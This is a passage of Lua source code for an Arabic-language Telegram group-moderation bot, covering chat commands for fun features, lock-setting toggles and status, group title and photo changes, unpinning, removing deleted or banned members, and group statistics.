Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء امر نسبة الغباء ', 1, 'md')
DevBrAnD:del(BrAnD..'StupidNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
BrAnD = math.random(0,100);
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ نسبة غباء '..text..' هي : '..BrAnD..'%', 1, 'md')
DevBrAnD:del(BrAnD..'StupidNsba:BrAnD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
--     SoUrCe BrAnD     --
if text == "تفعيل حساب العمر" and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل حساب العمر'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Age:BrAnD'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل حساب العمر'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Age:BrAnD'..msg.chat_id_,true)  
end
if not DevBrAnD:get(BrAnD..'BrAnD:Age:BrAnD'..msg.chat_id_) then
if text and text:match("^احسب (.*)$") and SoUrCeCh(msg) or text and text:match("^عمري (.*)$") and SoUrCeCh(msg) then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiBrAnD.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.BrAnD
Dev_BrAnD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     SoUrCe BrAnD     --
if text == "تفعيل معاني الاسماء" and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل معاني الاسماء'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Mean:BrAnD'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل معاني الاسماء'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Mean:BrAnD'..msg.chat_id_,true)  
end
if not DevBrAnD:get(BrAnD..'BrAnD:Mean:BrAnD'..msg.chat_id_) then
if text and text:match("^معنى الاسم (.*)$") and SoUrCeCh(msg) or text and text:match("^معنى اسم (.*)$") and SoUrCeCh(msg) then 
local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
UrlMean = https.request('https://apiBrAnD.ml/Mean.php?BrAnD='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
t = Mean.ok.BrAnD
Dev_BrAnD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     SoUrCe BrAnD     --
if text == "غنيلي" and SoUrCeCh(msg) then
data,res = https.request('https://apiBrAnD.ml/Audios.php')
if res == 200 then
Audios = json:decode(data)
if Audios.Info == true then
local Text ='♰ ⌯ تم اختيار المقطع الصوتي لك'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '♰ ⌯ BrAnD TEAM',url="t.me/CXRCX"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
--     SoUrCe BrAnD     --
if Admin(msg) then
if DevBrAnD:get(BrAnD..'BrAnD:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ الروابط ↫ "..mute_links.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ المعرف ↫ "..lock_tag.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ المتحركه ↫ "..mute_gifs.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الملصقات" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ الملصقات ↫ "..lock_sticker.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الصور" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ الصور ↫ "..mute_photo.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ الفيديو ↫ "..mute_video.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الاونلاين" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local BrAnDTeAM= "\n" .."♰ ⌯ الاونلاين ↫ "..mute_in.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الدردشه" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ الدردشه ↫ "..mute_text.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local BrAnDTeAM= "\n" .."♰ ⌯ التوجيه ↫ "..lock_forward.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الاغاني" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ الاغاني ↫ "..mute_music.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local BrAnDTeAM= "\n" .."♰ ⌯ الصوت ↫ "..mute_voice.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ الجهات ↫ "..lock_contact.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الماركداون" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local BrAnDTeAM= "\n" .."♰ ⌯ الماركداون ↫ "..markdown.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الهاشتاك" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local BrAnDTeAM= "\n" .."♰ ⌯ الهاشتاك ↫ "..lock_htag.."\n"Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "التعديل" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local BrAnDTeAM= "\n" .."♰ ⌯ التعديل ↫ "..mute_edit.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "التثبيت" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local BrAnDTeAM= "\n" .."♰ ⌯ التثبيت ↫ "..lock_pin.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الاشعارات" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ الاشعارات ↫ "..lock_tgservice.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الكلايش" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ الكلايش ↫ "..lock_spam.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الدخول" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local BrAnDTeAM= "\n" .."♰ ⌯ الدخول ↫ "..lock_Join.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الشبكات" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ الشبكات ↫ "..lock_wp.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "المواقع" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ المواقع ↫ "..lock_location.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "العربيه" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ العربيه ↫ "..lock_arabic.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الانكليزيه" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local BrAnDTeAM= "\n" .."♰ ⌯ الانكليزيه ↫ "..lock_english.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الكفر" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local BrAnDTeAM= "\n" .."♰ ⌯ الكفر ↫ "..lock_kaf.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الفشار" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local BrAnDTeAM= "\n" .."♰ ⌯ الفشار ↫ "..lock_fshar.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
if text == "الطائفيه" then if DevBrAnD:get(BrAnD..'BrAnD:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local BrAnDTeAM= "\n" .."♰ ⌯ الطائفيه ↫ "..lock_taf.."\n" Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM, 1, 'md') end
end
--     SoUrCe BrAnD     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل كشف الاعدادات'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل كشف الاعدادات'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:LockSettings'..msg.chat_id_) 
end
--     SoUrCe BrAnD     --
if text == 'تفعيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل اوامر التحشيش'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Lock:Stupid'..msg.chat_id_)
end
if text == 'تعطيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل اوامر التحشيش'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Lock:Stupid'..msg.chat_id_,true)
end
--     SoUrCe BrAnD     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل ردود المدير'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل ردود المدير'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Lock:GpRed'..msg.chat_id_,true)
end
--     SoUrCe BrAnD     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل ردود المطور'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل ردود المطور'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Lock:AllRed'..msg.chat_id_,true)
end
--     SoUrCe BrAnD     --
if Sudo(msg) then
if text == 'تفعيل المغادره' or text == '↫ تفعيل المغادره♰' then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل المغادره بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD.."BrAnD:Left:Bot"..BrAnD)
end
if text == 'تعطيل المغادره' or text == '↫ تعطيل المغادره♰' then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل المغادره بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD.."BrAnD:Left:Bot"..BrAnD,true) 
end 
if text == 'تفعيل الاذاعه' or text == '↫ تفعيل الاذاعه♰' then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل الاذاعه بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD.."BrAnD:Send:Bot"..BrAnD)
end
if text == 'تعطيل الاذاعه' or text == '↫ تعطيل الاذاعه♰' then 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل الاذاعه بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD.."BrAnD:Send:Bot"..BrAnD,true) 
end
end
--     SoUrCe BrAnD     --
if text and text:match("^ضع اسم (.*)$") and Manager(msg) and ChCheck(msg) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
if data.message_ == "ChANnEl chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"♰ ⌯ البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"♰ ⌯ ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات")  
else
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تغير اسم المجموعه'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
end
--     SoUrCe BrAnD     --
if msg.content_.photo_ then
if DevBrAnD:get(BrAnD..'BrAnD:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"♰ ⌯ عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
DevBrAnD:del(BrAnD..'BrAnD:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"♰ ⌯ ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevBrAnD:del(BrAnD..'BrAnD:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
else
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تغير صورة المجموعه'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
DevBrAnD:del(BrAnD..'BrAnD:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
end 
end
if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
Dev_BrAnD(msg.chat_id_,msg.id_, 1, '♰ ⌯ ارسل صورة المجموعه الان', 1, 'md')
DevBrAnD:set(BrAnD..'BrAnD:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     SoUrCe BrAnD     --
if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف صورة المجموعه")  
return false  
end
--     SoUrCe BrAnD     --
if Manager(msg) then
if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
if DevBrAnD:sismember(BrAnD.."BrAnD:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_BrAnD(msg.chat_id_,msg.id_, 1, "♰ ⌯ التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChANnElMessage",ChANnEl_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
DevBrAnD:del(BrAnD..'BrAnD:PinnedMsg'..msg.chat_id_)
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم الغاء تثبيت الرساله'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"♰ ⌯ انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"♰ ⌯ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     SoUrCe BrAnD     --
if text and text:match("^الغاء تثبيت الكل$") then  
if DevBrAnD:sismember(BrAnD.."BrAnD:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_BrAnD(msg.chat_id_,msg.id_, 1, "♰ ⌯ التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChANnElMessage",ChANnEl_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم الغاء تثبيت الكل'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
DevBrAnD:del(BrAnD.."BrAnD:PinnedMsg"..msg.chat_id_)
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"♰ ⌯ انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"♰ ⌯ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     SoUrCe BrAnD     --
if text and text:match("^اعاده تثبيت$") and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and ChCheck(msg) then
if DevBrAnD:sismember(BrAnD.."BrAnD:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_BrAnD(msg.chat_id_,msg.id_, 1, "♰ ⌯ التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
local pin_id = DevBrAnD:get(BrAnD..'BrAnD:PinnedMsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم اعادة تثبيت الرساله'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end end
end
--     SoUrCe BrAnD     --
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' or text == 'طرد الحسابات المحذوفه' or text == 'حذف المحذوفين' then  
tdcli_function({ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
ChatKick(msg.chat_id_, data.id_)
end
end,nil)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم طرد المحذوفين")  
end,nil)
end
--     SoUrCe BrAnD     --
if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and ChCheck(msg) or text and text:match("^مسح المطرودين$") or text and text:match("^حذف المطرودين$") and ChCheck(msg) then
local function RemoveBlockList(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_BrAnD(msg.chat_id_, msg.id_, 0,'♰ ⌯ *لا يوجد محظورين*', 1, 'md')
DevBrAnD:del(BrAnD..'BrAnD:Ban:'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
DevBrAnD:del(BrAnD..'BrAnD:Ban:'..msg.chat_id_)
x = x + 1
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف المحظورين")  
end
end
tdcli_function({ID="GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
end
--     SoUrCe BrAnD     --
if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الكروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
local Muted = DevBrAnD:scard(BrAnD.."BrAnD:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChANnElFull",ChANnEl_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المجموعه ↫ ❨ '..dp.title_..' ❩\n♰ ⌯ الايدي ↫ ❨ '..msg.chat_id_..' ❩\n♰ ⌯ عدد الاعضاء ↫ ❨ *'..data.member_count_..'* ❩\n♰ ⌯ عدد الادمنيه ↫ ❨ *'..data.administrator_count_..'* ❩\n♰ ⌯ عدد المطرودين ↫ ❨ *'..data.kicked_count_..'* ❩\n♰ ⌯ عدد المكتومين ↫ ❨ *'..Muted..'* ❩\n♰ ⌯ عدد رسائل المجموعه ↫ ❨ *'..(msg.id_/2097152/0.5)..'* ❩\n⍆═════BR═════⍅\n', 1, 'md') 
end,nil)
end,nil)
end
--     SoUrCe BrAnD     --
if text and text:match('^كشف (-%d+)') then
local ChatId = text:match('كشف (-%d+)') 
if not SudoBot(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطورين فقط', 1, 'md')
else
local ConstructorList = DevBrAnD:scard(BrAnD.."BrAnD:Constructor:"..ChatId) or 0
local BanedList = DevBrAnD:scard(BrAnD.."BrAnD:Ban:"..ChatId) or 0
local ManagerList = DevBrAnD:scard(BrAnD.."BrAnD:Managers:"..ChatId) or 0
local MutedList = DevBrAnD:scard(BrAnD.."BrAnD:Muted:"..ChatId) or 0
local TkeedList = DevBrAnD:scard(BrAnD.."BrAnD:BrAnD:Tkeed:"..ChatId) or 0
local AdminsList = DevBrAnD:scard(BrAnD.."BrAnD:Admins:"..ChatId) or 0
